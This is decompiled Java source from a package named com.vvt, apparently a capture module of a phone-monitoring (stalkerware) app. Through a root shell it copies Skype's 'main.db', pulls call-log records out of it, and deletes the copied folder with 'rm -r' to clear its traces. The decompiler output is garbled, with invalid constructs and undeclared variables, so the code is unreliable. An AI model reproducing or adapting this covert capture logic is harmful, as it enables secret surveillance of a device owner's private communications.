package com.vvt.capture.e.c.a.a.b;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.e.b.b.d;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private String d;
  private long e = -1;
  private String f;
  
  public b(String paramString1, String paramString2)
  {
    this.d = paramString1;
    this.f = paramString2;
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    return d.a(paramString2, paramString1, "main.db", paramString3, paramString4);
  }
  
  private void c()
  {
    String str1 = d();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  private String d()
  {
    return p.a(this.d, "skype_calllog");
  }
  
  public g a()
  {
    l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    for (;;)
    {
      try
      {
        localObject = this.d;
        localObject = d.a((String)localObject);
        String str1 = d();
        String str2 = this.d;
        String str3 = this.f;
        str2 = d.a(str2, (String)localObject, str1, str3);
        if (str2 == null) {
          continue;
        }
        str3 = this.f;
        str4 = a(str1, str2, (String)localObject, str3);
        j = com.vvt.ag.b.a(str4);
        if (j == 0)
        {
          str2 = this.f;
          localObject = d.b((String)localObject, str1, str2);
          boolean bool3 = com.vvt.ag.b.a((String)localObject);
          if (!bool3)
          {
            localObject = com.vvt.capture.e.c.a.b.a((String)localObject);
            if (localObject != null)
            {
              long l2 = com.vvt.capture.e.c.a.b.c(str4);
              bool1 = false;
              localObject = null;
              l3 = l2;
              j = 0;
              str2 = null;
              boolean bool4 = l3 < l1;
              if (bool4) {
                continue;
              }
              int k = 10;
              if (j >= k) {
                continue;
              }
              l4 = 6000L;
            }
          }
        }
      }
      catch (Exception localException1)
      {
        Object localObject;
        String str4;
        long l4;
        int i;
        boolean bool5;
        boolean bool2;
        FxSimpleEventReference localFxSimpleEventReference;
        long l3 = l1;
        int j = c;
        if (j == 0) {
          continue;
        }
        continue;
        this.e = l3;
        continue;
        l3 = l1;
        continue;
      }
      try
      {
        SystemClock.sleep(l4);
        l4 = com.vvt.capture.e.c.a.b.c(str4);
        i = j + 1;
        j = i;
        l3 = l4;
      }
      catch (Exception localException2) {}
    }
    l3 = l1;
    c();
    bool5 = l3 < l1;
    if (bool5)
    {
      l1 = -2;
      bool5 = l3 < l1;
      if (bool5) {}
    }
    else
    {
      bool2 = b;
      if (bool2) {}
      l3 = this.e;
      localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
      localFxSimpleEventReference.<init>();
      localObject = Long.valueOf(l3);
      localFxSimpleEventReference.setReference((Long)localObject);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = d();
      String str1 = this.d;
      str1 = d.a(str1);
      String str2 = this.d;
      String str3 = this.f;
      str2 = d.a(str2, str1, (String)localObject, str3);
      if (str2 != null)
      {
        int i = str2.length();
        if (i > 0)
        {
          str3 = this.f;
          str2 = a((String)localObject, str2, str1, str3);
          str3 = this.f;
          localObject = d.b(str1, (String)localObject, str3);
          boolean bool2 = a;
          if (bool2) {}
          localObject = com.vvt.capture.e.c.a.b.a(str2, (String)localObject, paramInt);
          localArrayList.addAll((Collection)localObject);
          bool3 = a;
          if (bool3) {}
          c();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = c;
        if (!bool3) {}
      }
    }
    bool3 = a;
    if (bool3) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    try
    {
      Object localObject = ((g)paramg1).getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = ((g)paramg2).getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      String str1 = d();
      localObject = this.d;
      String str2 = d.a((String)localObject);
      localObject = this.d;
      String str3 = this.f;
      localObject = d.a((String)localObject, str2, str1, str3);
      if (localObject != null)
      {
        int i = ((String)localObject).length();
        if (i > 0)
        {
          str3 = this.f;
          localObject = a(str1, (String)localObject, str2, str3);
          str3 = this.f;
          str1 = d.b(str2, str1, str3);
          boolean bool2 = a;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          localObject = com.vvt.capture.e.c.a.b.a((String)localObject, str1, l1, l2);
          localArrayList.addAll((Collection)localObject);
          bool1 = a;
          if (bool1) {}
          c();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public void b()
  {
    this.e = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/MyUncaughtExceptionHandler/a/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */